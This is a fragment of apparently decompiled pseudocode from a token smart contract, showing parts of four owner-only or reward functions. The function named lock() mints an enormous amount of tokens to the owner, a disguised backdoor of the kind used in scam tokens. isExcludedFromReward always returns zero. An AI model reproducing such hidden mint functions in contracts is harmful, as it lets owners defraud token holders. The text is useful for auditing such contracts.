...
function isExcludedFromReward(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return 0
...
function lock() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if balanceOf[address(msg.sender)] > 0xffffffffffffffffffffffffffffffffffff001cfd8cd98b9970a4f27fffffff:
        revert with 'NH{q', 17
    balanceOf[address(msg.sender)] += 5190000000000000 * 10^18
    return 1
}
...
function removeDItem(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    ...
    while uint8(idx) < stor13.length:
        mem[0] = 13
        if stor13[uint8(idx)] == arg1:
            if uint8(idx) >= stor13.length:
                revert with 'NH{q', 50
            mem[0] = 13
            stor13[uint8(idx)] = 0
        if uint8(idx) == 255:
...
function removeItem(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    ...
    while uint8(idx) < stor12.length:
        mem[0] = 12
        if stor12[uint8(idx)].field_0 == arg1:
            if uint8(idx) >= stor12.length:
                revert with 'NH{q', 50
            mem[0] = 12
            stor12[uint8(idx)].field_0 = 0
        if uint8(idx) == 255:
            revert with 'NH{q', 17
        idx = uint8(idx) + 1
        continue 
